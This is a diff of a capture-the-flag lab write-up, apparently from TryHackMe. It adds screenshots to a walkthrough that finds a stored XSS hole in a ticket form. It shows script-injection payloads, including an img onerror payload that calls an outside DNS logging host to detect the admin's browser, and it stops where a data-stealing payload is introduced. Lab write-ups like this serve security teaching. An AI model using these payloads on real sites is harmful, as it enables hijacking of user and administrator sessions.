@@ -52,9 +52,18 @@ nikto -h 10.10.28.159
 
 ![](./assets/main.png)
 
-1. Register up an account (any)
-2. Login
+1. Click register to register up a new account 
+
+![](./assets/register.png)
+
+2. After logging in we see the dashboard.
+
+![](./assets/dashboard.png)
+
 3. Cheking the webpage we see the message box is vunerable to XSS injection
+
+![](./assets/createticket.png)
+
 ```js
 </textarea><script>alert(1)</script>
 ```
@@ -71,13 +80,15 @@ http://10.10.10.100 This is a DNS service that logs dns calls for us. We can als
 
 Knowing we can use xss lets try a call back to the dns service. 
 
+![](/assets/test.png)
+
 ```js
-</textarea><img/src=x onerror"//eb2da52f9a2e73bde0e673ea61b489fb.log.tryhackme.tech/"/>
+</textarea><img/src=x onerror"//8ba7c46d7ea59d575b71ef3126651b6a.log.tryhackme.tech/"/>
 ```
 
-pic
-
 This gets the call back four times, 3 from us and once from the server (admin is looking)
+
+![](./assets/recievedadmin.png)
 
 Now lets try to get some data back! 
 New payload
